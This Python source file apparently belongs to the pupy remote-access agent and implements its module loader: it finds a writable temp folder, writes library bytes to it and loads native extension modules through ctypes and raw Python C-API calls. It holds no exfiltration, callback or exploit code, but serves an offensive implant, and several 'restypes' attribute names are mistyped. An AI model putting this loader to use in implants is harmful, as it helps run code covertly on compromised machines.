# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = (
    'package_context', 'find_writable_folder',
    'load_library_common', '_Py_PackageContext'
)

import sys
import importlib.util as imputil
import ctypes

from imp import load_dynamic

from os import path, fsencode
from tempfile import gettempdir

import pupy.agent

_Py_PackageContext = None

try:
    _Py_PackageContext = ctypes.c_char_p.in_dll(
            ctypes.pythonapi, '_Py_PackageContext')
except ValueError:
    pupy.agent.dprint('_Py_PackageContext not found in pythonapi')


class package_context(object):

    __slots__ = ('name', 'previous')

    def __init__(self, name):
        self.name = name
        self.previous = None

    def __enter__(self):
        if _Py_PackageContext is None:
            raise ValueError('_Py_PackageContext is not available')

        self.previous = _Py_PackageContext.value
        _Py_PackageContext.value = self.name

    def __exit__(self, exc_type, exc_value, exc_traceback):
        _Py_PackageContext.value = self.previous
        self.previous = None


def find_writable_folder(folders, validate=None):
    default_tmp = gettempdir()
    temporary_folders = tuple(folders)

    if default_tmp not in temporary_folders:
        temporary_folders += (default_tmp,)

    pupy.agent.dprint(
        'find_writable_folder: possible folders: {}',
        temporary_folders
    )

    for folder in temporary_folders:
        if not path.isdir(folder):
            continue

        if validate is None:
            return folder

        if validate(folder):
            return folder

    pupy.agent.dprint(
        'find_writable_folder: no folders found'
    )


def load_library_common(
    fd, filepath, content, name,
        dlopen=False, initfuncname=None, post_load_hook=None,
        close=False):

    r = fd.write(content)

    if close:
        fd.close()
    else:
        fd.flush()

    pupy.agent.dprint('load_library_common: Written {} to {}@{}: {} (closed={})'.format(
        len(content), name, filepath, r, close))

    if dlopen:
        handle = ctypes.CDLL(filepath)
        if post_load_hook:
            post_load_hook(handle, name)

        return handle

    if name.endswith(('.so', '.dll', '.pyd')):
        name = name.rsplit('.', 1)[0]

    module_name = name.split('.', 1)[-1]

    if initfuncname is None:
        initfuncname = 'init' + module_name

    if _Py_PackageContext is None:
        # Fallback to built-in imp.load_dynamic
        if initfuncname != 'init' + module_name:
            raise ValueError('Unexpected module_name')

        x = load_dynamic(module_name, filepath)
        pupy.agent.dprint(
            'load_dynamic({}, {}) -> {}', module_name, filepath, x)
        return x

    try:
        lib = ctypes.PyDLL(filepath)
        pupy.agent.dprint('load_library_common: Library loaded: {}', lib)
    except Exception as e:
        pupy.agent.dprint('load_library_common: failed to load library {}: {}', name, e)
        lib = ctypes.CDLL(filepath)
        pupy.agent.dprint('load_library_common: Library loaded: {} (fallback CDLL)', lib)

    if post_load_hook:
        post_load_hook(lib, name)

    initfunc = getattr(lib, initfuncname, None)

    if initfunc:
        class PyModuleDef(ctypes.Structure):
            _fields_ = [
                ("m_base", ctypes.c_char_p),
                ("pfunc", ctypes.c_void_p),
            ]
        #initfunc.restypes = [ctypes.py_object]
        initfunc.restypes = [ctypes.POINTER(PyModuleDef)]
        initfunc.argtypes = []
        pupy.agent.dprint('load_library_common: init found: {}', initfuncname)
        #TODO: importlib.machinery.ExtensionFileLoader ??
        _PyImport_FixupExtensionObject = ctypes.pythonapi._PyImport_FixupExtensionObject
        _PyImport_FixupExtensionObject.argtypes=[ctypes.py_object, ctypes.py_object, ctypes.py_object, ctypes.py_object]
        _PyImport_FixupExtensionObject.restypes=[ctypes.c_int]

        PyImport_GetModuleDict = ctypes.pythonapi.PyImport_GetModuleDict
        PyImport_GetModuleDict.restypes = [ctypes.py_object]
        PyImport_GetModuleDict.argtypes = []

        PyUnicode_FromString = ctypes.pythonapi.PyUnicode_FromString
        PyUnicode_FromString.restypes = [ctypes.py_object]
        PyUnicode_FromString.argtypes = [ctypes.c_char_p]


        PyModule_GetDef = ctypes.pythonapi.PyModule_GetDef
        PyModule_GetDef.argtypes = [ctypes.py_object]
        PyModule_GetDef.restypes = [ctypes.POINTER(PyModuleDef)]


        #TODO : check if it's a def with PyModule_GetDef
        # https://docs.python.org/3/extending/building.html

        with package_context(module_name.encode('utf8')):
            pupy.agent.dprint(
                'load_library_common: call init {}@{}', initfuncname, module_name
            )
            m_ptr = initfunc()
            pupy.agent.dprint(
                'load_library_common: call init {}@{} - complete',
                initfuncname, module_name
            )
            pupy.agent.dprint('PyInit result: {}', m_ptr)

            #d = PyModule_GetDef(m_ptr)
            #pupy.agent.dprint('PyModule_GetDef result: {}', d)

            PyModuleDef_Init = ctypes.pythonapi.PyModuleDef_Init
            PyModuleDef_Init.restypes = [ctypes.py_object]
            PyModuleDef_Init.argtypes = [ctypes.py_object]
            defmod = PyModuleDef_Init(m_ptr)
            pupy.agent.dprint('PyModuleDef_Init called: %s'%defmod)

            if defmod:
                PyModule_FromDefAndSpec = ctypes.pythonapi.PyModule_FromDefAndSpec2
                PyModule_FromDefAndSpec.argtypes = [ctypes.py_object, ctypes.py_object, ctypes.c_int]
                PyModule_FromDefAndSpec.restype = ctypes.py_object
                PyModule_ExecDef = ctypes.pythonapi.PyModule_ExecDef
                PyModule_ExecDef.argtypes = [ctypes.py_object, ctypes.c_void_p]
                PyModule_ExecDef.restypes = [ctypes.c_int]
                PyModule_GetDef = ctypes.pythonapi.PyModule_GetDef
                PyModule_GetDef.argtypes = [ctypes.py_object]
                PyModule_GetDef.restypes = [ctypes.c_void_p]
                PyModule_GetState = ctypes.pythonapi.PyModule_GetState
                PyModule_GetState.argtypes = [ctypes.py_object]
                PyModule_GetState.restypes = [ctypes.c_void_p]

                spec = imputil.spec_from_loader(module_name, loader=None)
                module = PyModule_FromDefAndSpec(defmod, spec, 1013)
                pupy.agent.dprint('PyModule_FromDefAndSpec2 result: {}', module)

                #    somehow, this is crashing ?? skiping this, not sure if it might cause issues

                #d=PyModule_GetDef(module)
                #s=PyModule_GetState(module)
                #pupy.agent.dprint('def: {} state: {}', d, s)
                #if not s:
                #    pupy.agent.dprint("executing PyModule_ExecDef ...")
                #    PyModule_ExecDef(module, d)
                #    pass

                pupy.agent.dprint('returning module !')
                return module

            name_ptr = PyUnicode_FromString(module_name.encode('utf8'))
            path_ptr = PyUnicode_FromString(module_name.encode('utf8'))

            modules_ptr = PyImport_GetModuleDict()
            res = _PyImport_FixupExtensionObject(m_ptr, name_ptr, path_ptr, modules_ptr)
            pupy.agent.dprint("result: _PyImport_FixupExtensionObject {}", res)
            if res < 0:
                raise ImportError("load_library_common: _PyImport_FixupExtensionObject failed")



    return __import__(module_name)
